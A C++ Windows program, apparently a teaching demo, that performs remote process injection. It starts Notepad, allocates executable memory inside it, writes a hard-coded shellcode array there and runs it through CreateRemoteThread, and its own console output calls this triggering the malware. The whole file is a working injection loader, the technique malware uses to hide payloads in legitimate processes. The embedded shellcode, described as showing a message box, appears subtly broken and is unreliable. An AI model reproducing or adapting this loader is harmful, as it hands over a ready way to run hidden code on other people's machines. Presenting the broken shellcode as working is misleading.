#include <iostream>
#include <windows.h>

unsigned char shellcode[] = 
    "\x48\x83\xEC\x28\x48\xB9\x75\x73\x65\x72\x33\x32\x2E\x64\x6C\x6C\x48"
    "\xC7\xC2\x00\x00\x00\x00\x48\x8B\x88\x60\x00\x00\x00\x48\x8B\x81\x18"
    "\x00\x00\x00\x48\x8B\x40\x30\x48\x8B\x70\x50\xFF\xD6\x48\x31\xC9\x48"
    "\x8D\x15\x15\x00\x00\x00\x48\x8D\x0D\x1E\x00\x00\x00\x41\xB9\x00\x00"
    "\x00\x00\xFF\xD0\x48\x83\xC4\x28\xC3\x48\x65\x6C\x6C\x6F\x20\x57\x6F"
    "\x72\x6C\x64\x00\x49\x6E\x6A\x65\x63\x74\x69\x6F\x6E\x00";

int main() {
    STARTUPINFOA si;
    PROCESS_INFORMATION pi;
    ZeroMemory(&si, sizeof(si));
    si.cb = sizeof(si);
    ZeroMemory(&pi, sizeof(pi));

    std::cout << "[*] Launching Notepad..." << std::endl;

    if (!CreateProcessA(
        "C:\\Windows\\System32\\notepad.exe", 
        NULL, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi)) 
    {
        std::cerr << "[!] Failed to launch Notepad. Error: " << GetLastError() << std::endl;
        return 1;
    }

    std::cout << "[+] Notepad launched. PID: " << pi.dwProcessId << std::endl;

    Sleep(1000);

    std::cout << "[*] Allocating memory in Notepad..." << std::endl;
    
    LPVOID pRemoteCode = VirtualAllocEx(
        pi.hProcess,
        NULL,
        sizeof(shellcode),
        MEM_COMMIT | MEM_RESERVE, 
        PAGE_EXECUTE_READWRITE 
    );

    if (pRemoteCode == NULL) {
        std::cerr << "[!] VirtualAllocEx failed. Error: " << GetLastError() << std::endl;
        return 1;
    }
    std::cout << "[+] Memory allocated at address: " << pRemoteCode << std::endl;

    std::cout << "[*] Writing Shellcode into Notepad..." << std::endl;
    
    if (!WriteProcessMemory(
        pi.hProcess, 
        pRemoteCode, 
        shellcode, 
        sizeof(shellcode), 
        NULL)) 
    {
        std::cerr << "[!] WriteProcessMemory failed. Error: " << GetLastError() << std::endl;
        return 1;
    }
    std::cout << "[+] Shellcode written successfully." << std::endl;

    std::cout << "[*] Creating Remote Thread to trigger the malware..." << std::endl;
    
    HANDLE hThread = CreateRemoteThread(
        pi.hProcess, 
        NULL, 
        0, 
        (LPTHREAD_START_ROUTINE)pRemoteCode, 
        NULL, 
        0, 
        NULL
    );

    if (hThread == NULL) {
        std::cerr << "[!] CreateRemoteThread failed. Error: " << GetLastError() << std::endl;
        return 1;
    }

    std::cout << "[+] SUCCESS! Check the Notepad window." << std::endl;
    std::cout << "[+] A Shellcode Message Box should appear from the Notepad process." << std::endl;

    CloseHandle(hThread);
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);

    std::cout << "\nPress Enter to exit...";
    std::cin.get();

    return 0;
}